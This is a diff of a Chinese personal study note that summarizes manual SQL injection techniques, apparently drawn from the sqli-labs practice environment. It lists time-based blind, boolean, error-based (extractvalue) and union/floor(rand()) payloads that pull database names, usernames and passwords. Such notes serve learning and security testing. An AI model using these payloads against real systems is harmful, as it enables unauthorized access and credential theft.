@@ -3,24 +3,13 @@ title: "[漏洞总结]0x1手工SQL总结"
 desc: TonyD0g
 date: 2022-01-05 15:55:26
 tags: 漏洞总结
+toc: true
 ---
 <font size=4 >
 
-###### [版本0x1] 
-###### 2022-01-05
-## SQL注入常用方法:
-#### (通常相互搭配)
+<!-- more -->
 
-- 1.时间型注入
-- 2.布尔型注入
-- 3.报错型注入
-- 4.UA注入
-- 5.referer注入
-- 6.Get/Post型注入
-- 7.cookie型注入
-- 8.编码注入
-
-1.时间型注入:
+## 1.时间型注入:
 ```
 库:
 id=admin' and if(length(database())=8,sleep(5),1)--+
@@ -33,20 +22,20 @@ id=admin' and if(left((select column_name from information_schema.columns where 
 id=admin' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+
 id=admin' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+
 ```
-2.布尔型注入:
+## 2.布尔型注入:
 ```
 根据 相关表达式是否相等 来判断注入是否成功.
 代码与 "1.时间型注入" 相同.
 ```
-3.报错型注入:
+## 3.报错型注入:
 ```
 根据 页面上显示的字符 来判断注入是否成功,比如注入成功后显示"success",注入失败后显示"fail".
 ```
-4/5/6/7/8 UA注入 , referer注入 , Get/Post注入 , cookie注入
+## 4/5/6/7/8 UA注入 , referer注入 , Get/Post注入 , cookie注入
 ```
 在UA头里注入 , 在referer里注入 , Get/Post方式注入 , 在cookie里注入
 ```
-8.编码注入
+## 8.编码注入
 ```
 注入的数据必须经过编码,否则注入无效.
 ```
@@ -66,7 +55,7 @@ id=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,pass
 同样利用not in,可以查询其他值:
 id=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','I-kill-you'))))--+
 ```
-concat函数
+## concat函数
 ```
 id=admin' union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a --+
 ```
